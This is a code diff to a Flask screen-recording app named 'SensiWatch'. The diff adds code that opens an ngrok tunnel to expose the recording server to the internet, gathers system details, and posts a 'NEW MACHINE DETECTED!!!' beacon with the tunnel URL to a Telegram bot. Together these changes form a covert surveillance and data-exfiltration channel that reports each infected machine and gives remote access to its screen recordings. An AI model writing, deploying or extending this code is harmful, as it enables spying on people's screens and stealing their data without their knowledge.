@@ -11,6 +11,9 @@ from functools import wraps
 import shutil
 import atexit
 from flask_session import Session
+import ngrok
+import requests
+
 
 app = Flask(__name__)
 
@@ -31,6 +34,9 @@ Session(app)
 HOST = os.getenv("HOST", "127.0.0.1")
 PORT = os.getenv("PORT", 5590)
 VIDEO_OUTPUT_FOLDER = os.getenv("VIDEO_OUTPUT_DIR", "video_output")
+NGROK_TOKEN = os.getenv("NGROK_TOKEN", "")
+TELEGRAM_CHATID = os.getenv("TELEGRAM_CHATID", "")
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
 
 
 def verify_authentication():
@@ -112,7 +118,7 @@ def download_video():
     Download the screen recording (protected by authentication).
     """
     try:
-        output_video.release()  # Release the video writer before download
+        output_video.release()
         return send_file(VIDEO_FILENAME, as_attachment=True)
     except Exception as e:
         return f"Error: {e}", 500
@@ -174,11 +180,89 @@ def custom_401(error):
     return Response('Authentication Required', 401, {'WWW-Authenticate': 'Basic realm="SensiWatch"'})
 
 
+def send_tg_msg(msg, chatid, bot_token):
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    payload = {
+        'chat_id': chatid,
+        'text': msg
+    }
+    try:
+        response = requests.post(url, data=payload)
+        response.raise_for_status()  # Raises an exception for HTTP errors
+        if response.status_code == 200:
+            print("Message sent successfully!")
+        else:
+            print("Failed to send message, status code:", response.status_code)
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending message to Telegram: {e}")
+
+def send_endpoint_msg(msg, url):
+    payload = {'message': msg}
+    try:
+        response = requests.post(url, json=payload)
+        response.raise_for_status()  # Raises an exception for HTTP errors
+        if response.status_code == 200:
+            print("Message sent to the endpoint successfully!")
+        else:
+            print("Failed to send message to the endpoint, status code:", response.status_code)
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending message to endpoint: {e}")
+
+import platform
+import psutil
+
+def get_system_info():
+    # Get general system info
+    system_info = {
+        "System": platform.system(),
+        "Node Name": platform.node(),
+        "Release": platform.release(),
+        "Version": platform.version(),
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+        "Architecture": platform.architecture()[0],
+        "CPU Cores": psutil.cpu_count(logical=False),  # Physical cores
+        "Total RAM": psutil.virtual_memory().total / (1024 ** 3),  # in GB
+        "Used RAM": psutil.virtual_memory().used / (1024 ** 3),  # in GB
+        "Free RAM": psutil.virtual_memory().available / (1024 ** 3),  # in GB
+        "CPU Usage": psutil.cpu_percent(interval=1),  # percentage
+        "Disk Usage": psutil.disk_usage('/').percent,  # percentage
+    }
+    return system_info
+
+
 # Register the cleanup function to run at exit
 atexit.register(cleanup)
 
 if __name__ == "__main__":
     try:
-        app.run(host=HOST, port=PORT, debug=True)
+        if NGROK_TOKEN:
+            print("Fetching remote loopback URL...")
+            listener = ngrok.connect(PORT, authtoken=NGROK_TOKEN)
+            lurl = listener.url()
+            print (f"Loopback URL established at: {lurl}")
+            if TELEGRAM_BOT_TOKEN and TELEGRAM_CHATID:
+                systeminfo = get_system_info()
+                msg = f"""
+NEW MACHINE DETECTED!!!
+LOOPBACK URL {lurl}
+SYSTEM INFO:
+System: {systeminfo['System']}
+Node Name: {systeminfo['Node Name']}
+Release: {systeminfo['Release']}
+Version: {systeminfo['Version']}
+Machine: {systeminfo['Machine']}
+Processor: {systeminfo['Processor']}
+Architecture: {systeminfo['Architecture']}
+CPU Cores: {systeminfo['CPU Cores']}
+Total RAM: {systeminfo['Total RAM']}
+Used RAM: {systeminfo['Used RAM']}
+Free RAM: {systeminfo['Free RAM']}
+CPU Usage: {systeminfo['CPU Usage']}
+Disk Usage: {systeminfo['Disk Usage']}
+"""
+                send_tg_msg(msg=msg, chatid=TELEGRAM_CHATID, bot_token=TELEGRAM_BOT_TOKEN)
+            print("Starting server...")
+        app.run(host=HOST, port=PORT)
     except KeyboardInterrupt:
         print("Shutting down...")
